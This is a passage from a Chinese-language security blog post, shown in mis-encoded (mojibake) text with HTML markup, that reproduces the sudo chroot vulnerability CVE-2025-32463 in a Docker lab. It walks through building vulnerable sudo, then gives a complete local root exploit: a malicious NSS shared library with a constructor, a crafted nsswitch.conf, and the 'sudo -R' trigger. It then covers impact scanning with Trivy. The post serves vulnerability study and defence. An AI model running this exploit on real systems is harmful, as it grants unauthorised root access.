ç¯å¢ƒæ­å»º</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ‰‹æŠŠæ‰‹æ•™å­¦ï¼šå¦‚ä½•é€šè¿‡å®¹å™¨å¿«é€Ÿæ­å»ºæ¼æ´ç¯å¢ƒã€‚æœ¬æ¬¡æ¼æ´å¤ç°å°†åœ¨ ubuntu24.04 å®¹å™¨é•œåƒä¸­å®Œæˆã€‚æ‰§è¡Œä¸‹è¿°å‘½ä»¤ï¼Œé©¬ä¸Šå¼€å¯æˆ‘ä»¬çš„æ—…ç¨‹å§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span> ubuntu:24.04 bash<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ä¿æŒç²¾ç®€ï¼ŒUbuntuã€Debian å’Œ Alpine ç­‰å¤šç§åŸºç¡€é•œåƒéƒ½ä¸é¢„è£… <code>sudo</code>ï¼Œä¸”<code>apt</code>å’Œ<code>yum</code>ç­‰ç³»ç»ŸåŒ…ç®¡ç†å·¥å…·å®‰è£…çš„ <code>sudo</code> å¯èƒ½ä¼šè¢«äºŒæ¬¡ä¿®æ”¹ï¼ˆä¾‹å¦‚æ‰“ä¸Šäº†å®‰å…¨è¡¥ä¸ã€ç¦ç”¨äº†æŸäº›é€‰é¡¹ç­‰ï¼‰ï¼Œè¿™å¯èƒ½å¯¼è‡´æ¼æ´æ— æ³•å¤ç°æˆ–è€…æ˜¯è¡Œä¸ºä¸ä¸€è‡´ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŸºäºæºç ï¼Œè‡ªè¡Œæ„å»ºå¹¶å®‰è£…ä¸€ä¸ªå—å½±å“ç‰ˆæœ¬çš„<code>sudo</code>ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªç”¨äºå®‰å…¨æµ‹è¯•çš„æ™®é€šç”¨æˆ·ï¼Œä¾‹å¦‚ <code>yaney</code>ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p>å®‰è£… <code>sudo</code> ä¾èµ–åº“ã€ç¼–è¯‘å·¥å…·é“¾å’Œæºç ä¸‹è½½å·¥å…·ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install -y wget ca-certificates build-essential pkg-config libpam0g-dev libselinux1-dev zlib1g-dev  libssl-dev <br></code></pre></td></tr></table></figure><ul><li>æºç ä¸‹è½½å·¥å…·ï¼šç”¨äºä»å®˜ç½‘è·å–<code>sudo</code> æºç å¹¶é€šè¿‡ HTTPS å®‰å…¨ä¸‹è½½ã€‚åŒ…æ‹¬ï¼š<code>wget</code>,<code>ca-certificates</code>ï¼›</li><li>ç¼–è¯‘å·¥å…·é“¾ï¼šç”¨äºä»æºç æ„å»º <code>sudo</code>ï¼ŒåŒ…æ‹¬ç¼–è¯‘å™¨ã€æ„å»ºç³»ç»Ÿå’Œä¾èµ–æ£€æµ‹å·¥å…·ã€‚åŒ…æ‹¬ï¼š<code>build-essential</code>ã€<code>pkg-config</code>ï¼›</li><li>sudo ä¾èµ–åº“ï¼šæä¾›è®¤è¯ã€å®‰å…¨ä¸Šä¸‹æ–‡ã€å‹ç¼©å’ŒåŠ å¯†ç­‰<code>sudo</code> æ‰€éœ€çš„åŸºç¡€åŠŸèƒ½æ”¯æŒã€‚åŒ…æ‹¬ï¼š<code>libpam0g-dev</code>,<code>libselinux1-dev</code>,<code>zlib1g-dev</code>,<code>libssl-dev</code>ã€‚</li></ul></li><li><p>æ¸…ç† apt ç¼“å­˜ï¼Œå‡å°é•œåƒä½“ç§¯ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*<br></code></pre></td></tr></table></figure></li><li><p>åˆ‡æ¢åˆ°<code>/opt</code> ç›®å½•ï¼Œè¯¥ç›®å½•ä¸€èˆ¬ç”¨äºå­˜æ”¾ç¬¬ä¸‰æ–¹æºç æˆ–ç¨‹åºï¼Œéå¸¸é€‚åˆå­˜æ”¾ <code>sudo</code> çš„æºç ã€‚ç„¶åä¸‹è½½å¹¶è§£å‹<code>sudo</code>çš„æºä»£ç å‹ç¼©åŒ…ï¼ˆç‰ˆæœ¬ä¸º<code>1.9.16p2</code>ï¼‰ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt<br>wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz<br>tar xzf sudo-1.9.16p2.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å¹¶å®‰è£… <code>sudo</code>ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> sudo-1.9.16p2 <br><span class="hljs-comment"># é¢„ç¼–è¯‘ã€‚ä¸å¯ç”¨ libgcrypt æ”¯æŒï¼Œæ„å»ºå®Œæˆåå°†ç¨‹åºå®‰è£…åˆ° /usr ç›®å½•ä¸‹ã€‚</span><br>./configure --disable-gcrypt --prefix=/usr<br><span class="hljs-comment"># ç¼–è¯‘</span><br>make<br><span class="hljs-comment"># å®‰è£…</span><br>make install<br></code></pre></td></tr></table></figure></li><li><p>æ–°åˆ›å»ºä¸€ä¸ªæ™®é€šçš„å®‰å…¨æµ‹è¯•ç”¨æˆ·å¹¶åˆ‡æ¢ï¼Œä¾‹å¦‚<code>yaney</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m -s /bin/bash yaney<br>su yaney<br></code></pre></td></tr></table></figure><ul><li><code>-m</code>ï¼šè‡ªåŠ¨åˆ›å»ºç”¨æˆ·çš„ home ç›®å½•<code>/home/yaney</code>ï¼›</li><li><code>-s /bin/bash</code>ï¼šæŒ‡å®šé»˜è®¤ SHELL ä¸º <code>bash</code>ã€‚</li></ul></li></ol><h3 id="2-5-æ¼æ´åˆ©ç”¨"><a href="#2-5-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.5 æ¼æ´åˆ©ç”¨"></a>2.5 æ¼æ´åˆ©ç”¨</h3><p>å‡†å¤‡å¥½ç¯å¢ƒè¿‡åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¿«é€Ÿè¿›è¡Œæ¼æ´åˆ©ç”¨äº†ï¼Œè¿™ä¸ªè¿‡ç¨‹éå¸¸ç®€å•ï¼Œè®©æˆ‘ä»¬æ¥è¯•ä¸€è¯•å§ã€‚</p><h4 id="æ­¥éª¤ä¸€ï¼šå‡†å¤‡æ”»å‡»ç¯å¢ƒ"><a href="#æ­¥éª¤ä¸€ï¼šå‡†å¤‡æ”»å‡»ç¯å¢ƒ" class="headerlink" title="æ­¥éª¤ä¸€ï¼šå‡†å¤‡æ”»å‡»ç¯å¢ƒ"></a>æ­¥éª¤ä¸€ï¼šå‡†å¤‡æ”»å‡»ç¯å¢ƒ</h4><ol><li><p>åˆ›å»ºä¸€ä¸ªç”¨äºæ„é€ æ”»å‡»ç¯å¢ƒçš„ä¸´æ—¶ç›®å½•ï¼Œè¿™ä¸ªä¸´æ—¶ç›®å½•åœ¨ä½¿ç”¨ç»“æŸè¿‡åï¼Œç³»ç»Ÿä¼šè‡ªè¡Œåˆ é™¤ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š<code>XXXXXX</code>æ˜¯ç‰¹æ®Šæ ‡è®°ï¼Œå‘Šè¯‰<code>mktemp</code>å°†å…¶æ›¿æ¢æˆéšæœºå­—ç¬¦ï¼ˆé€šå¸¸æ˜¯ 6 ä¸ªå­—æ¯&#x2F;æ•°å­—ï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬è¿›å…¥è¯¥ç›®å½•çš„æ—¶å€™ï¼Œ<code>XXXXXX</code>éœ€è¦æ›¿æ¢æˆå®é™…çš„å­—ç¬¦ä¸²ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mktemp</span> -d /tmp/sudochroot.stage.XXXXXX<br><span class="hljs-built_in">cd</span> /tmp/sudochroot.stage.XXXXXX<br></code></pre></td></tr></table></figure></li><li><p>&#x20;å†™å…¥å¸¦æœ‰æ„é€ å‡½æ•°<code>hacker</code>çš„ C ä»£ç ï¼Œå®ç°ä¸€æ—¦åŠ è½½å°±ææƒæ‰§è¡Œï¼ˆlibnss æ’ä»¶ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">cat &gt; hacker.c &lt;&lt;EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">hacker</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setreuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  setregid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>  chdir(<span class="hljs-string">&quot;/&quot;</span>);<br>  execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>EOF<br><br></code></pre></td></tr></table></figure><ul><li>æ”»å‡»è„šæœ¬éœ€è¦åŒ…å«æ„é€ å‡½æ•°<code>__attribute__((constructor))</code>ï¼Œä¸ä¸»å‡½æ•°<code>main()</code>éœ€è¦æ‰‹åŠ¨è§¦å‘ä¸ä¸€æ ·ï¼Œæ„é€ å‡½æ•°åœ¨å…±äº«åº“è¢«åŠ è½½æ—¶å°±ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚è¿™æ ·æˆ‘ä»¬åç»­ç¼–è¯‘çš„<code>.so</code>æ–‡ä»¶åœ¨è¢«åŠ è½½æ—¶å°±èƒ½ç›´æ¥è¿è¡Œæ¶æ„ä»£ç äº†ï¼›</li><li>å°†æœ‰æ•ˆ UID&#x2F;GID å’ŒçœŸå® UID&#x2F;GID éƒ½è®¾ç½®ä¸º <code>0</code>ï¼Œå³åˆ‡æ¢åˆ°<code>root</code> ç”¨æˆ·ã€‚ä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾ç½®ï¼Œæ˜¯å› ä¸ºä¸€äº›ç³»ç»Ÿè°ƒç”¨æˆ–è€…æ“ä½œä»ç„¶ä¾èµ–äºæœ‰æ•ˆ UID&#x2F;GID æˆ–çœŸå® UID&#x2F;GID æ˜¯ä¸º 0ï¼›</li><li>åˆ‡æ¢å½“å‰å·¥ä½œç›®å½•åˆ°<code>/</code>ï¼Œé¿å…å½“å‰ç›®å½•è¢«åˆ ã€å½±å“ shell å·¥ä½œï¼›</li><li>é‡æ–°æ‰“å¼€ä¸€ä¸ªæ–°çš„ <code>bash</code> ã€‚</li></ul></li></ol><h4 id="æ­¥éª¤äºŒï¼šæ„é€ -chroot-æ–‡ä»¶ç³»ç»Ÿç»“æ„"><a href="#æ­¥éª¤äºŒï¼šæ„é€ -chroot-æ–‡ä»¶ç³»ç»Ÿç»“æ„" class="headerlink" title="æ­¥éª¤äºŒï¼šæ„é€  chroot æ–‡ä»¶ç³»ç»Ÿç»“æ„"></a>æ­¥éª¤äºŒï¼šæ„é€  chroot æ–‡ä»¶ç³»ç»Ÿç»“æ„</h4><ol><li><p>åˆ›å»ºæ”»å‡»ç›®å½•ç»“æ„ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p hacker/etc libnss_<br></code></pre></td></tr></table></figure><ul><li><code>hacker/etc</code> ç”¨æ¥å­˜æ”¾åç»­æ‰€è¯´çš„ <code>nsswitch.conf</code>æ–‡ä»¶ å’Œ <code>group</code> æ–‡ä»¶ã€‚è‹¥<code>--chroot</code> åˆ° <code>hacker</code> æ–‡ä»¶å¤¹ä¸­ï¼Œé‚£ä¹ˆè¿™äº›æ–‡ä»¶è·¯å¾„å°†è¢«è§£æä¸ºå¯»å¸¸æ¨¡å¼ï¼Œå³ï¼š<ul><li><code>hacker/etc/nsswitch.conf</code>å°±è¢«è§£æä¸º<code>/etc/nsswitch.conf</code>ï¼›</li><li><code>hacker/etc/group</code> å°±è¢«è§£æä¸º<code>/etc/group</code>ï¼›</li></ul></li><li><code>libnss_</code> ç”¨æ¥å­˜æ”¾ <code>hacker.c</code> æ‰€ç¼–è¯‘å¥½çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“ã€‚</li></ul></li><li><p>åˆ›å»º <code>nsswitch.conf</code>æ–‡ä»¶ï¼Œé…ç½®åŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„ NSS æ¨¡å—ï¼Œå³ <code>--chroot</code>è‹¥è¦è§£æç”¨æˆ·ä¿¡æ¯ï¼ˆpasswdï¼‰ï¼Œéœ€è¦åŠ è½½åä¸º <code>hacker</code> çš„ NSS æ¨¡å—ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;passwd: /hacker&quot;</span> &gt; hacker/etc/nsswitch.conf<br></code></pre></td></tr></table></figure></li><li><p>æ‹·è´ä¸€ä»½ group æ–‡ä»¶ä»¥é¿å… NSS æŠ¥é”™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/group hacker/etc<br></code></pre></td></tr></table></figure></li></ol><h4 id="æ­¥éª¤ä¸‰ï¼šæ„é€ å¹¶å‘½åæ¶æ„å…±äº«åº“"><a href="#æ­¥éª¤ä¸‰ï¼šæ„é€ å¹¶å‘½åæ¶æ„å…±äº«åº“" class="headerlink" title="æ­¥éª¤ä¸‰ï¼šæ„é€ å¹¶å‘½åæ¶æ„å…±äº«åº“"></a>æ­¥éª¤ä¸‰ï¼šæ„é€ å¹¶å‘½åæ¶æ„å…±äº«åº“</h4><p>ä½¿ç”¨<code>gcc -shared -fPIC</code>ç¼–è¯‘å¸¦æ„é€ å‡½æ•°çš„å…±äº«åº“<code>hacker.c</code>ï¼Œè¾“å‡ºä¸º<code>libnss_/hacker.so.2</code>ï¼ŒåŒ¹é…<code>passwd: /hacker</code> çš„æ¨¡å—è·¯å¾„æ‹¼æ¥é€»è¾‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -Wl,-init,hacker -o libnss_/hacker.so.2 hacker.c<br><br></code></pre></td></tr></table></figure><ul><li>-sharedï¼šç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡ï¼ˆå³<code>.so</code> åŠ¨æ€é“¾æ¥åº“ï¼‰è€Œä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼›</li><li>-fPICï¼šç”Ÿæˆä¸ä½ç½®æ— å…³çš„ä»£ç ï¼Œæ˜¯ç¼–è¯‘åŠ¨æ€åº“æ—¶å¿…é¡»åŠ çš„ï¼›</li><li>-Wl,-init,hackerï¼šå‘Šè¯‰é“¾æ¥å™¨ï¼Œå½“åŠ¨æ€åº“è¢«åŠ è½½æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨<code>hacker()</code> å‡½æ•°ï¼›</li><li>-o libnss _&#x2F;hacker.so.2ï¼šè¾“å‡ºæ–‡ä»¶åä¸º<code>libnss_/hacker.so.2</code>ï¼›</li><li>hacker.cï¼šæºä»£ç æ–‡ä»¶ï¼Œå®šä¹‰äº†<code>void hacker(void)</code> å‡½æ•°ã€‚</li></ul><h4 id="æ­¥éª¤å››ï¼šè§¦å‘æ¼æ´æ‰§è¡Œææƒ"><a href="#æ­¥éª¤å››ï¼šè§¦å‘æ¼æ´æ‰§è¡Œææƒ" class="headerlink" title="æ­¥éª¤å››ï¼šè§¦å‘æ¼æ´æ‰§è¡Œææƒ"></a>æ­¥éª¤å››ï¼šè§¦å‘æ¼æ´æ‰§è¡Œææƒ</h4><p>ä½¿ç”¨<code>sudo -R</code>è¿›å…¥ <code>chroot</code> ç¯å¢ƒï¼Œå¹¶åœ¨ <code>chroot</code> ç¯å¢ƒä¸­æ‰§è¡Œ<code>/bin/bash</code>ï¼ŒåŒæ—¶è§¦å‘ <code>glibc</code>åˆå§‹åŒ– NSSï¼Œè‡ªåŠ¨åŠ è½½æˆ‘ä»¬åˆšåˆšæ„é€ çš„æ¶æ„å…±äº«åº“<code>libnss_/hacker.so.2</code>å¹¶è¿›è¡Œææƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R hacker /bin/bash<br></code></pre></td></tr></table></figure><p><img src="/image/image_Y6ta-LnzQ4.png" alt="å›¾ 11ï¼šæ¼æ´åˆ©ç”¨æµç¨‹" title="å›¾ 11ï¼šæ¼æ´åˆ©ç”¨æµç¨‹"></p><h3 id="2-6-å½±å“é¢æ’æŸ¥"><a href="#2-6-å½±å“é¢æ’æŸ¥" class="headerlink" title="2.6 å½±å“é¢æ’æŸ¥"></a>2.6 å½±å“é¢æ’æŸ¥</h3><p><code>sudo</code> æ˜¯å¤§å¤šæ•°ä¸»æœºéƒ½ä¼šå®‰è£…çš„è½¯ä»¶åŒ…ï¼Œå¦‚æœå…¬å¸èµ„äº§åŒ…å«äº† <code>sudo</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•è¿›è¡Œå½±å“é¢æ’æŸ¥å‘¢ï¼Ÿç ”ç©¶è¿‡äº‘åŸç”Ÿå®‰å…¨çš„åŒå­¦åº”è¯¥éƒ½å¬è¯´è¿‡ä¸€æ¬¾é•œåƒå®‰å…¨å·¥å…·ï¼š<a href="https://trivy.dev/latest/" title="Trivy">Trivy</a>ã€‚Trivy æ‹¥æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯å®ƒçš„æ¼æ´æ‰«æåŠŸèƒ½ã€‚</p><p><img src="/image/image_r4gp6QUwbp.png" alt="å›¾ 12ï¼šä½¿ç”¨ Trivy è¿›è¡Œå½±å“é¢æ’æŸ¥" title="å›¾ 12ï¼šä½¿ç”¨ Trivy è¿›è¡Œå½±å“é¢æ’æŸ¥"></p><p>è‹¥éœ€è¦æ‰«æçš„æ˜¯é•œåƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨<code>image</code>å­å‘½ä»¤å³å¯ã€‚Trivy æ‹¥æœ‰å¤šç§æ‰«æå™¨ï¼Œä¸ºäº†å¿«é€Ÿå¾—åˆ°ç»“æœï¼Œæˆ‘ä»¬ä»…å¼€å¯äº†æ¼æ´æ‰«æå™¨<code>vuln</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln<br></code></pre></td></tr></table></figure><p>Trivy å·²ç»æ¢æµ‹å‡º  <code>y4ney/cve-2025-32463-lab:source</code> çš„æ“ä½œç³»ç»Ÿæ˜¯ ubuntu:24.04ï¼Œå¹¶ä¸”è¯†åˆ«å‡ºäº† 226 ä¸ªç³»ç»Ÿå±‚è½¯ä»¶åŒ…ï¼Œè¿™äº›ç³»ç»Ÿå±‚è½¯ä»¶åŒ…å…±åŒ…å« 870 ä¸ªæ¼æ´ï¼›ä¸”é•œåƒå¹¶æœªè¢«è¯†åˆ«å‡ºåº”ç”¨å±‚ä¾èµ–åº“ï¼Œå› æ­¤ä¸åŒ…å«åº”ç”¨å±‚çš„æ¼æ´ã€‚</p><p><img src="/image/image_85AvWOVKeq.png" alt="å›¾ 13ï¼šä½¿ç”¨ Trivy å¯¹ y4ney&#x2F;cve-2025-32463-lab:source é•œåƒè¿›è¡Œæ‰«æ" title="å›¾ 13ï¼šä½¿ç”¨ Trivy å¯¹ y4ney&#x2F;cve-2025-32463-lab:source é•œåƒè¿›è¡Œæ‰«æ"></p><p>è‹¥å¯¹é•œåƒ<code>y4ney/cve-2025-32463-lab:deb</code>è¿›è¡Œæ‰«æï¼Œåˆ™è¢«è¯†åˆ«å‡ºäº† 168 ä¸ªç³»ç»Ÿå±‚è½¯ä»¶åŒ…å’Œ 857 ä¸ªæ¼æ´ã€‚</p><p><img src="/image/image_2JLJBZujvB.png" alt="å›¾ 14ï¼šä½¿ç”¨ Trivy å¯¹ y4ney&#x2F;cve-2025-32463-lab:deb é•œåƒè¿›è¡Œæ‰«æ" title="å›¾ 14ï¼šä½¿ç”¨ Trivy å¯¹ y4ney&#x2F;cve-2025-32463-lab:deb é•œåƒè¿›è¡Œæ‰«æ"></p><p>æ‰§è¡Œä¸‹è¿°å‘½ä»¤ï¼Œæˆ‘ä»¬å‘ç°ï¼š<code>y4ney/cve-2025-32463-lab:source</code> å¹¶æœªæ‰«æå‡º CVE-2025-32463 æ¼æ´ï¼Œè€Œ<code>y4ney/cve-2025-32463-lab:deb</code> å´å¯ä»¥æ‰«æå‡º CVE-2025-32463 æ¼æ´ã€‚é€ æˆè¿™ç§å…³é”®å·®å¼‚çš„åŸå› æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬å†äº†è§£ä¸€äº›çŸ¥è¯†ï¼Œåç»­å†è¯¦ç»†åˆ†æå…¶åŸå› ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Vulnerabilities[]&#x27;</span>| grep CVE-2025-32463<br></code></pre></td></tr></table></figure><p><img src="/image/image_EUlKBOv6qe.png" alt="å›¾ 15ï¼šä¸¤ç±»é•œåƒä¸­ CVE-2025-32463 æ¼æ´çš„æ‰«ææƒ…å†µ" title="å›¾ 15ï¼šä¸¤ç±»é•œåƒä¸­CVE-2025-32463 æ¼æ´çš„æ‰«ææƒ…å†µ"></p><p>Trivy ä¸»è¦æ˜¯é€šè¿‡ç‰ˆæœ¬æ¯”å¯¹æ¥è¯†åˆ«è½¯ä»¶åŒ…ä¸­çš„æ¼æ´ï¼Œå› æ­¤è¿™äº›æ¼æ´ä¸ä¸€å®šéƒ½éœ€è¦è¿›è¡Œä¿®å¤ã€‚æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„å› ç´ åŒ…å«æ–¹æ–¹é¢é¢ï¼Œä¾‹å¦‚ï¼š</p><ul><li>æ¼æ´çš„å¨èƒç­‰çº§å¹¶æœªè¾¾åˆ°é«˜å±ã€ç”šè‡³è¶…å±ï¼›</li><li>æ¼æ´çš„å¨èƒç­‰çº§å¹¶ä¸ç­‰äºå®ƒçš„é£é™©ç­‰çº§ï¼›</li><li>åŒ…å«æ¼æ´çš„è½¯ä»¶åŒ…å¯èƒ½å¹¶æœªè¢«ä½¿ç”¨åˆ°ï¼Œå› æ­¤æ¼æ´ä¸å…·å¤‡å¯è¾¾æ€§ï¼›</li><li>å¼ºè¡Œä¿®å¤ç³»ç»Ÿå±‚è½¯ä»¶åŒ…ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¾èµ–å®ƒçš„åº”ç”¨å´©æºƒï¼›</li><li>å¹¶éæ‰€æœ‰çš„æ¼æ´éƒ½æ‹¥æœ‰ä¿®å¤è¡¥ä¸ï¼Œè®©æˆ‘ä»¬è¿›è¡Œå‡çº§ï¼›</li><li>â€¦â€¦</li></ul><p>è‹¥ç›´æ¥å¯¹ ubuntu å®˜æ–¹æœ€æ–°çš„é•œåƒè¿›è¡Œæ¼æ´æ‰«æï¼Œæˆ‘ä»¬éƒ½ä¼šå‘ç°ï¼šå°½ç®¡æ˜¯ä¸åŒ…å«ä»»ä½•ç¬¬ä¸‰æ–¹å†…å®¹çš„å®˜æ–¹æœ€æ–°é•œåƒï¼Œä¹Ÿä¸ä¼šæ˜¯å®Œå…¨ä¸åŒ…å«æ¼æ´çš„ï¼Œé‚£ä¹ˆåŸºäºè¿™äº›åŸºç¡€é•œåƒæ„å»ºçš„é•œåƒï¼Œæˆ‘ä»¬æ€ä¹ˆèƒ½è¦æ±‚å®ƒä»¬ä¸èƒ½åŒ…å«ä»»ä½•æ¼æ´å‘¢ï¼Ÿ</p><p><img src="/image/image_pyUtqydEgT.png" alt="å›¾ 16ï¼šubuntu æœ€æ–°çš„å®˜æ–¹æ¼æ´ä¹ŸåŒ…å«éƒ¨åˆ†æ¼æ´" title="å›¾ 16ï¼šubuntu æœ€æ–°çš„å®˜æ–¹æ¼æ´ä¹ŸåŒ…å«éƒ¨åˆ†æ¼æ´"></p><p>ç›®å‰ä¸šç•Œæ²¡æœ‰å®Œå…¨å…¬å¼€çš„ç‰¹åˆ«å¥½çš„å·¥ç¨‹åŒ–æ–¹æ¡ˆå’Œæ¡ˆä¾‹ï¼Œè®©æˆ‘ä»¬åŸºäºé£é™©å¯¹è¿™äº›æ¼æ´è¿›è¡Œé‡å®šçº§ã€é™å™ªä»¥åŠè‡ªåŠ¨åŒ–ä¿®å¤ã€‚å»å¹´ï¼Œæˆ‘åœ¨ CCS å¤§ä¼šä¸Šå¯¹è¿™æ–¹é¢çš„é—®é¢˜è¿›è¡Œäº†æ¢è®¨ï¼Œä½†æ–¹æ¡ˆè¿˜æœªèµ°å‡ºå®éªŒå®¤ï¼Œè¿›è¡Œä¼ä¸šçº§åˆ«çš„è½åœ°ï¼Œå¤§å®¶å¯ä»¥é…Œæƒ…å‚è€ƒå‚è€ƒã€‚ç›¸å…³å†…å®¹è¯·æŸ¥çœ‹<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E9%87%91%E8%9E%8D%E7%A7%91%E6%8A%80%E4%B8%AD%E7%9A%84%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%EF%BC%9A%E5%9F%BA%E4%BA%8E%20eBPF%20%E5%92%8C%20WASM%20%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%99%8D%E5%99%AA%E6%8A%80%E6%9C%AF.pdf" title="ã€Šé‡‘èç§‘æŠ€ä¸­çš„å®¹å™¨å®‰å…¨ï¼šåŸºäºeBPFå’ŒWASMçš„æ¼æ´é™å™ªæŠ€æœ¯ã€‹">ã€Šé‡‘èç§‘æŠ€ä¸­çš„å®¹å™¨å®‰å…¨ï¼šåŸºäº eBPF å’Œ WASM çš„æ¼æ´é™å™ªæŠ€æœ¯ã€‹</a>ã€‚</p><p><img src="/image/image_70MpL9pgzs.png" alt="å›¾ 17ï¼šé‡‘èç§‘æŠ€ä¸­çš„å®¹å™¨å®‰å…¨ï¼šåŸºäº eBPF å’Œ WASM çš„æ¼æ´é™å™ªæŠ€æœ¯" title=" 7ï¼šé‡‘èç§‘æŠ€ä¸­çš„å®¹å™¨å®‰å…¨ï¼šåŸºäºeBPFå’ŒWASMçš„æ¼æ´é™å™ªæŠ€æœ¯"></p><p>è‹¥éœ€è¦æ‰«æçš„æ˜¯ä¸»æœºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Trivy çš„ <code>rootfs</code>å­å‘½ä»¤ã€‚å…¶å®ä¸»æœºæ¼æ´æ‰«æå’Œé•œåƒæ¼æ´æ‰«æçš„åŸç†å’Œå®ç°æ–¹å¼å¤§åŒå°å¼‚ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼šå®¹å™¨é•œåƒçš„æ¼æ´æ‰«æé¦–å…ˆéœ€è¦å¯¹é•œåƒæ–‡ä»¶è¿›è¡Œè§£å‹ç¼©çš„æ“ä½œï¼Œè€Œä¸»æœºæ¼æ´æ‰«æåˆ™ä¸éœ€è¦ã€‚ä¸»æœºæ¼æ´æ‰«æå’Œé•œåƒæ¼æ´æ‰«æåç»­åŒæ 